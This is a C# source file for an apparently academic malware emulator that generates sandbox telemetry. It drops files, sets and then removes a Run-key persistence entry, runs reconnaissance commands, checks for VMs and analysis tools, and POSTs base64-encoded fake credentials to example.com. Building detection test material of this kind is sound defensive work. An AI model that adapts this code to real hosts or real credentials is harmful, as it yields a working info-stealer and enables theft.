/*
 * IsoLens Malware Emulator — Academic Behavioral Testing Sample
 * ==============================================================
 * A HARMLESS executable that mimics common malware behaviors so that
 * sandbox monitoring tools (Sysmon, Procmon, handle, tcpvcon, etc.)
 * can capture realistic telemetry.
 *
 * Compile:  csc /out:malware_emulator.exe malware_emulator.cs
 * Run:      Double-click malware_emulator.exe (or run from CLI)
 *
 * Simulated behaviors:
 *   Phase 1 – File System     : drop files, read sensitive dirs, hidden files
 *   Phase 2 – Registry        : write Run key (persistence), then clean up
 *   Phase 3 – Network         : DNS lookups, HTTP GET/POST to example.com
 *   Phase 4 – Process Spawn   : cmd, powershell, whoami, ipconfig, netstat…
 *   Phase 5 – Evasion         : VM detection, sandbox hostname check, uptime
 *   Phase 6 – Exfiltration    : base64-encode fake creds, POST them out
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace IsoLens
{
    class MalwareEmulator
    {
        // ── Paths ──────────────────────────────────────────────────
        static readonly string WorkDir  = Path.Combine(Path.GetTempPath(), "isolens_emulator");
        static readonly string LogFile  = Path.Combine(WorkDir, "emulator_log.txt");
        static readonly string JsonFile = Path.Combine(WorkDir, "emulator_results.json");

        static StreamWriter logWriter;
        static List<string> jsonEntries = new List<string>();

        // ── Win32 ──────────────────────────────────────────────────
        [DllImport("kernel32.dll")]
        static extern ulong GetTickCount64();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);
        const uint FILE_ATTRIBUTE_HIDDEN = 0x02;

        // ═══════════════════════════════════════════════════════════
        // Logging helpers
        // ═══════════════════════════════════════════════════════════

        static void Log(string msg)
        {
            string line = string.Format("[{0}] {1}", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), msg);
            Console.WriteLine(line);
            if (logWriter != null)
            {
                logWriter.WriteLine(line);
                logWriter.Flush();
            }
        }

        static void Record(string category, string action, string detail, bool success = true)
        {
            string level = success ? "INFO" : "WARN";
            Log(string.Format("{0} [{1}] {2} — {3}", level, category, action, detail));

            // Build a JSON object (manual, no dependencies)
            string entry = string.Format(
                "    {{\"category\":\"{0}\",\"action\":\"{1}\",\"detail\":\"{2}\",\"success\":{3},\"timestamp\":\"{4}\"}}",
                Escape(category), Escape(action), Escape(detail),
                success ? "true" : "false",
                DateTime.Now.ToString("o"));
            jsonEntries.Add(entry);
        }

        static string Escape(string s)
        {
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 1 — FILE SYSTEM OPERATIONS
        // ═══════════════════════════════════════════════════════════

        static void PhaseFileSystem()
        {
            Log("");
            Log("═══ PHASE 1: File System Operations ═══");

            // 1a – Drop a fake PE payload in temp
            try
            {
                string payloadPath = Path.Combine(WorkDir, "dropped_payload.bin");
                byte[] data = new byte[512];
                data[0] = 0x4D; data[1] = 0x5A; // MZ header
                new Random().NextBytes(data);
                data[0] = 0x4D; data[1] = 0x5A;
                File.WriteAllBytes(payloadPath, data);
                Record("filesystem", "drop_payload", "Wrote fake PE stub to " + payloadPath);
            }
            catch (Exception e) { Record("filesystem", "drop_payload", e.Message, false); }

            // 1b – Create a hidden config file
            try
            {
                string hiddenPath = Path.Combine(WorkDir, ".hidden_c2_config.dat");
                File.WriteAllText(hiddenPath,
                    "c2_server=evil.example.com\r\ninterval=30\r\nprotocol=https\r\n");
                SetFileAttributes(hiddenPath, FILE_ATTRIBUTE_HIDDEN);
                Record("filesystem", "create_hidden_file", "Hidden C2 config at " + hiddenPath);
            }
            catch (Exception e) { Record("filesystem", "create_hidden_file", e.Message, false); }

            // 1c – Read sensitive directories
            string[] sensitivePaths = new string[] {
                Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\Desktop"),
                Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\Documents"),
                Environment.ExpandEnvironmentVariables(@"%APPDATA%\Microsoft\Windows\Recent"),
                Environment.ExpandEnvironmentVariables(@"%SYSTEMROOT%\System32\config"),
                Environment.ExpandEnvironmentVariables(@"%APPDATA%\Microsoft\Credentials"),
            };
            foreach (string p in sensitivePaths)
            {
                try
                {
                    string[] entries = Directory.GetFileSystemEntries(p);
                    Record("filesystem", "read_sensitive_dir",
                        string.Format("{0} -> {1} entries", p, entries.Length));
                }
                catch (Exception e)
                {
                    Record("filesystem", "read_sensitive_dir",
                        string.Format("{0} -> {1}", p, e.Message), false);
                }
            }

            // 1d – Write a batch dropper script
            try
            {
                string batPath = Path.Combine(WorkDir, "update_service.bat");
                File.WriteAllText(batPath,
                    "@echo off\r\n" +
                    "echo [*] Emulated dropper running...\r\n" +
                    "whoami\r\n" +
                    "ipconfig /all\r\n" +
                    "netstat -ano\r\n");
                Record("filesystem", "write_batch_dropper", "Batch dropper at " + batPath);
            }
            catch (Exception e) { Record("filesystem", "write_batch_dropper", e.Message, false); }

            // 1e – Create an encrypted exfil staging area
            try
            {
                string staging = Path.Combine(WorkDir, "staging", "exfil");
                Directory.CreateDirectory(staging);
                Random rng = new Random();
                for (int i = 0; i < 5; i++)
                {
                    byte[] chunk = new byte[1024];
                    rng.NextBytes(chunk);
                    File.WriteAllBytes(Path.Combine(staging, string.Format("chunk_{0:D3}.enc", i)), chunk);
                }
                Record("filesystem", "create_staging_dir",
                    "Staging area with 5 encrypted chunks at " + staging);
            }
            catch (Exception e) { Record("filesystem", "create_staging_dir", e.Message, false); }

            // 1f – Copy self to a persistence location
            try
            {
                string selfPath = Process.GetCurrentProcess().MainModule.FileName;
                string copyPath = Path.Combine(WorkDir, "svchost_update.exe");
                File.Copy(selfPath, copyPath, true);
                Record("filesystem", "self_copy",
                    "Copied self to " + copyPath + " (mimicking persistence dropper)");
            }
            catch (Exception e) { Record("filesystem", "self_copy", e.Message, false); }
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 2 — REGISTRY OPERATIONS
        // ═══════════════════════════════════════════════════════════

        static void PhaseRegistry()
        {
            Log("");
            Log("═══ PHASE 2: Registry Operations ═══");

            string keyPath   = @"Software\Microsoft\Windows\CurrentVersion\Run";
            string valueName = "IsoLensEmulatorTest";
            string valueData = Path.Combine(WorkDir, "svchost_update.exe");

            // 2a – Write a Run key for persistence
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true))
                {
                    key.SetValue(valueName, valueData, RegistryValueKind.String);
                }
                Record("registry", "write_run_key",
                    string.Format(@"HKCU\{0}\{1} = {2}", keyPath, valueName, valueData));
            }
            catch (Exception e) { Record("registry", "write_run_key", e.Message, false); }

            // 2b – Read it back to confirm
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath))
                {
                    object val = key.GetValue(valueName);
                    Record("registry", "read_run_key", "Read back: " + val);
                }
            }
            catch (Exception e) { Record("registry", "read_run_key", e.Message, false); }

            // 2c – Query interesting registry locations
            string[] regQueries = new string[] {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
            };
            foreach (string rp in regQueries)
            {
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(rp))
                    {
                        int count = key != null ? key.SubKeyCount : 0;
                        Record("registry", "query_key",
                            string.Format(@"HKLM\{0} -> {1} subkeys", rp, count));
                    }
                }
                catch (Exception e)
                {
                    Record("registry", "query_key",
                        string.Format(@"HKLM\{0} -> {1}", rp, e.Message), false);
                }
            }

            // 2d – Clean up the Run key
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true))
                {
                    key.DeleteValue(valueName, false);
                }
                Record("registry", "cleanup_run_key", "Deleted emulator persistence key");
            }
            catch (Exception e) { Record("registry", "cleanup_run_key", e.Message, false); }
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 3 — NETWORK OPERATIONS
        // ═══════════════════════════════════════════════════════════

        static void PhaseNetwork()
        {
            Log("");
            Log("═══ PHASE 3: Network Operations ═══");

            // 3a – DNS resolution
            string[] targets = { "example.com", "example.org", "dns.google", "cloudflare.com" };
            foreach (string host in targets)
            {
                try
                {
                    IPAddress[] ips = Dns.GetHostAddresses(host);
                    Record("network", "dns_resolve",
                        string.Format("{0} -> {1}", host, ips[0]));
                }
                catch (Exception e)
                {
                    Record("network", "dns_resolve",
                        string.Format("{0} -> {1}", host, e.Message), false);
                }
            }

            // 3b – HTTP GET (simulated C2 beacon)
            string[] urls = { "http://example.com", "http://example.org" };
            foreach (string url in urls)
            {
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                    req.UserAgent = "IsoLens-Emulator/1.0 (Sandbox Test)";
                    req.Timeout = 10000;
                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                    {
                        using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
                        {
                            string body = sr.ReadToEnd();
                            Record("network", "http_get",
                                string.Format("{0} -> HTTP {1}, {2} bytes",
                                    url, (int)resp.StatusCode, body.Length));
                        }
                    }
                }
                catch (Exception e)
                {
                    Record("network", "http_get",
                        string.Format("{0} -> {1}", url, e.Message), false);
                }
            }

            // 3c – Raw TCP socket (simulated reverse-shell connect)
            try
            {
                using (TcpClient tcp = new TcpClient())
                {
                    tcp.SendTimeout = 5000;
                    tcp.ReceiveTimeout = 5000;
                    tcp.Connect("example.com", 80);
                    NetworkStream ns = tcp.GetStream();
                    byte[] req = Encoding.ASCII.GetBytes("GET / HTTP/1.0\r\nHost: example.com\r\n\r\n");
                    ns.Write(req, 0, req.Length);
                    byte[] buf = new byte[1024];
                    int n = ns.Read(buf, 0, buf.Length);
                    Record("network", "raw_tcp_socket",
                        string.Format("TCP to example.com:80 -> {0} bytes received", n));
                }
            }
            catch (Exception e) { Record("network", "raw_tcp_socket", e.Message, false); }

            // 3d – UDP packet (DNS-style, to a safe target)
            try
            {
                using (UdpClient udp = new UdpClient())
                {
                    byte[] payload = Encoding.ASCII.GetBytes("ISOLENS_BEACON_TEST");
                    udp.Send(payload, payload.Length, "example.com", 53);
                    Record("network", "udp_send", "UDP beacon sent to example.com:53");
                }
            }
            catch (Exception e) { Record("network", "udp_send", e.Message, false); }
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 4 — PROCESS SPAWNING
        // ═══════════════════════════════════════════════════════════

        static string RunCmd(string fileName, string arguments, int timeoutMs = 15000)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = arguments,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                using (Process proc = Process.Start(psi))
                {
                    string stdout = proc.StandardOutput.ReadToEnd();
                    string stderr = proc.StandardError.ReadToEnd();
                    proc.WaitForExit(timeoutMs);
                    string output = (stdout + " " + stderr).Trim();
                    if (output.Length > 400) output = output.Substring(0, 400) + "...";
                    return string.Format("exit {0}: {1}", proc.ExitCode, output);
                }
            }
            catch (Exception e)
            {
                return "ERROR: " + e.Message;
            }
        }

        static void PhaseProcesses()
        {
            Log("");
            Log("═══ PHASE 4: Process Spawning ═══");

            // 4a – System reconnaissance (classic first-stage recon)
            string[][] recon = new string[][] {
                new string[] {"whoami", ""},
                new string[] {"hostname", ""},
                new string[] {"ipconfig", "/all"},
                new string[] {"netstat", "-ano"},
                new string[] {"systeminfo", ""},
                new string[] {"tasklist", ""},
                new string[] {"net", "user"},
                new string[] {"net", "localgroup administrators"},
                new string[] {"arp", "-a"},
                new string[] {"route", "print"},
            };
            foreach (string[] cmd in recon)
            {
                string result = RunCmd(cmd[0], cmd[1]);
                Record("process", cmd[0] + (cmd[1].Length > 0 ? "_" + cmd[1].Replace(" ", "").Replace("/","").Replace("-","") : ""),
                    result);
            }

            // 4b – PowerShell execution
            Record("process", "powershell_start", "Launching PowerShell commands...");

            string psResult1 = RunCmd("powershell.exe",
                "-NoProfile -NonInteractive -Command \"Get-Process | Select-Object -First 15 Name,Id,CPU | Format-Table -AutoSize\"");
            Record("process", "powershell_get_process", psResult1);

            string psResult2 = RunCmd("powershell.exe",
                "-NoProfile -NonInteractive -Command \"Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 10 | Format-Table -AutoSize\"");
            Record("process", "powershell_net_connections", psResult2);

            string psResult3 = RunCmd("powershell.exe",
                "-NoProfile -NonInteractive -Command \"[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('IsoLens beacon test'))\"");
            Record("process", "powershell_base64_encode", psResult3);

            // 4c – cmd /c chain
            string cmdResult = RunCmd("cmd.exe",
                "/c \"echo %USERNAME% on %COMPUTERNAME% at %DATE% %TIME%\"");
            Record("process", "cmd_env_dump", cmdResult);

            // 4d – Execute the batch dropper
            string batPath = Path.Combine(WorkDir, "update_service.bat");
            if (File.Exists(batPath))
            {
                string batResult = RunCmd("cmd.exe", "/c \"" + batPath + "\"");
                Record("process", "execute_batch_dropper", batResult);
            }

            // 4e – wmic queries
            string wmicResult = RunCmd("wmic", "process list brief");
            Record("process", "wmic_process_list", wmicResult);

            // 4f – schtasks query
            string schtResult = RunCmd("schtasks", "/query /fo LIST");
            Record("process", "schtasks_query", schtResult);
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 5 — EVASION & ENVIRONMENT FINGERPRINTING
        // ═══════════════════════════════════════════════════════════

        static void PhaseEvasion()
        {
            Log("");
            Log("═══ PHASE 5: Evasion & Environment Fingerprinting ═══");

            // 5a – Check for VM artifacts
            string[] vmFiles = {
                @"C:\Windows\System32\VBoxService.exe",
                @"C:\Windows\System32\VBoxTray.exe",
                @"C:\Windows\System32\vmtoolsd.exe",
                @"C:\Windows\System32\drivers\vboxguest.sys",
                @"C:\Windows\System32\drivers\vmhgfs.sys",
            };
            int vmFound = 0;
            foreach (string p in vmFiles)
            {
                bool exists = File.Exists(p);
                if (exists) vmFound++;
                Record("evasion", "vm_artifact_check",
                    string.Format("{0} -> {1}", p, exists ? "FOUND" : "not found"));
            }
            if (vmFound > 0)
                Record("evasion", "vm_detected",
                    string.Format("VM environment detected via {0} artifacts — real malware would EXIT here", vmFound));

            // 5b – Check hostname for sandbox keywords
            string hostname = Environment.MachineName.ToLower();
            string[] sandboxNames = { "sandbox", "malware", "virus", "analysis", "cuckoo", "sample", "test" };
            bool nameFound = false;
            foreach (string kw in sandboxNames)
            {
                if (hostname.Contains(kw))
                {
                    Record("evasion", "hostname_check",
                        string.Format("Suspicious keyword '{0}' in hostname '{1}'", kw, hostname));
                    nameFound = true;
                    break;
                }
            }
            if (!nameFound)
                Record("evasion", "hostname_check",
                    string.Format("Hostname '{0}' — no sandbox keywords detected", hostname));

            // 5c – Uptime check
            try
            {
                ulong ms = GetTickCount64();
                double min = ms / 60000.0;
                Record("evasion", "uptime_check",
                    string.Format("System uptime: {0:F1} minutes (malware often waits if < 10 min)", min));
            }
            catch { Record("evasion", "uptime_check", "Could not determine uptime", false); }

            // 5d – Process count
            try
            {
                int count = Process.GetProcesses().Length;
                Record("evasion", "process_count",
                    string.Format("{0} running processes (low count may indicate sandbox)", count));
            }
            catch (Exception e) { Record("evasion", "process_count", e.Message, false); }

            // 5e – Check for analysis tools running
            string[] analysisTools = { "procmon", "procmon64", "wireshark", "fiddler", "processhacker",
                                       "x64dbg", "x32dbg", "ollydbg", "ida", "ida64", "sysmon", "sysmon64" };
            foreach (string tool in analysisTools)
            {
                try
                {
                    Process[] procs = Process.GetProcessesByName(tool);
                    if (procs.Length > 0)
                        Record("evasion", "analysis_tool_detected",
                            string.Format("{0} is running (PID {1}) — real malware would alter behavior", tool, procs[0].Id));
                }
                catch { }
            }

            // 5f – Small delay (anti-sandbox timing check)
            Record("evasion", "timing_delay", "Sleeping 2 seconds (simulating sandbox-aware delay)...");
            Thread.Sleep(2000);
            Record("evasion", "timing_delay", "Resumed after delay");
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 6 — DATA EXFILTRATION SIMULATION
        // ═══════════════════════════════════════════════════════════

        static void PhaseExfiltration()
        {
            Log("");
            Log("═══ PHASE 6: Data Exfiltration Simulation ═══");

            // 6a – Harvest fake credentials
            string fakeCreds =
                "{\"browser\":\"TestBrowser\"," +
                "\"entries\":[" +
                "{\"url\":\"https://bank.example.com\",\"user\":\"victim\",\"pass\":\"P@ssw0rd123!\"}," +
                "{\"url\":\"https://mail.example.com\",\"user\":\"target\",\"pass\":\"S3cr3t!!\"}" +
                "]}";

            // 6b – Base64 encode
            string blob = Convert.ToBase64String(Encoding.UTF8.GetBytes(fakeCreds));
            string exfilPath = Path.Combine(WorkDir, "staging", "exfil", "creds.b64");
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(exfilPath));
                File.WriteAllText(exfilPath, blob);
                Record("exfiltration", "encode_credentials",
                    string.Format("Base64 credential blob ({0} chars) -> {1}", blob.Length, exfilPath));
            }
            catch (Exception e) { Record("exfiltration", "encode_credentials", e.Message, false); }

            // 6c – "Exfiltrate" via HTTP POST to example.com
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://example.com");
                req.Method = "POST";
                req.ContentType = "application/octet-stream";
                req.UserAgent = "IsoLens-Emulator/1.0";
                req.Timeout = 10000;
                byte[] postData = Encoding.UTF8.GetBytes(blob.Substring(0, Math.Min(256, blob.Length)));
                req.ContentLength = postData.Length;
                using (Stream s = req.GetRequestStream()) { s.Write(postData, 0, postData.Length); }
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                {
                    Record("exfiltration", "http_exfil",
                        string.Format("POST to example.com -> HTTP {0}", (int)resp.StatusCode));
                }
            }
            catch (WebException e)
            {
                if (e.Response != null)
                {
                    int code = (int)((HttpWebResponse)e.Response).StatusCode;
                    Record("exfiltration", "http_exfil",
                        string.Format("POST to example.com -> HTTP {0} (expected rejection)", code));
                }
                else
                    Record("exfiltration", "http_exfil", e.Message, false);
            }
            catch (Exception e) { Record("exfiltration", "http_exfil", e.Message, false); }

            // 6d – Collect environment variables (info stealer behavior)
            try
            {
                StringBuilder envDump = new StringBuilder();
                foreach (System.Collections.DictionaryEntry entry in Environment.GetEnvironmentVariables())
                {
                    envDump.AppendFormat("{0}={1}\r\n", entry.Key, entry.Value);
                }
                string envPath = Path.Combine(WorkDir, "staging", "exfil", "env_dump.txt");
                File.WriteAllText(envPath, envDump.ToString());
                Record("exfiltration", "env_dump",
                    string.Format("Dumped {0} environment variables to {1}", Environment.GetEnvironmentVariables().Count, envPath));
            }
            catch (Exception e) { Record("exfiltration", "env_dump", e.Message, false); }
        }

        // ═══════════════════════════════════════════════════════════
        // MAIN
        // ═══════════════════════════════════════════════════════════

        static int Main(string[] args)
        {
            Directory.CreateDirectory(WorkDir);
            logWriter = new StreamWriter(LogFile, false, Encoding.UTF8);

            Log("╔══════════════════════════════════════════════════════╗");
            Log("║   IsoLens Malware Emulator — Academic Use Only      ║");
            Log("║   This program is HARMLESS. It simulates behaviors  ║");
            Log("║   so sandbox monitoring tools can capture events.   ║");
            Log("╚══════════════════════════════════════════════════════╝");
            Log(string.Format("PID: {0} | User: {1} | Host: {2}",
                Process.GetCurrentProcess().Id,
                Environment.UserName,
                Environment.MachineName));
            Log("Work dir: " + WorkDir);
            Log("Log file: " + LogFile);
            Log("");

            Stopwatch sw = Stopwatch.StartNew();

            PhaseFileSystem();
            PhaseRegistry();
            PhaseNetwork();
            PhaseProcesses();
            PhaseEvasion();
            PhaseExfiltration();

            sw.Stop();

            Log("");
            Log(string.Format("═══ ALL PHASES COMPLETED in {0:F1} seconds ═══", sw.Elapsed.TotalSeconds));
            Log("JSON results -> " + JsonFile);
            Log("Text log     -> " + LogFile);

            // Write JSON results
            StringBuilder json = new StringBuilder();
            json.AppendLine("[");
            for (int i = 0; i < jsonEntries.Count; i++)
            {
                json.Append(jsonEntries[i]);
                if (i < jsonEntries.Count - 1) json.Append(",");
                json.AppendLine();
            }
            json.AppendLine("]");
            File.WriteAllText(JsonFile, json.ToString(), Encoding.UTF8);

            Log("");
            Log("Press Enter to exit...");
            logWriter.Close();

            // Keep window open if double-clicked
            if (args.Length == 0)
            {
                try { Console.ReadLine(); } catch { }
            }

            return 0;
        }
    }
}
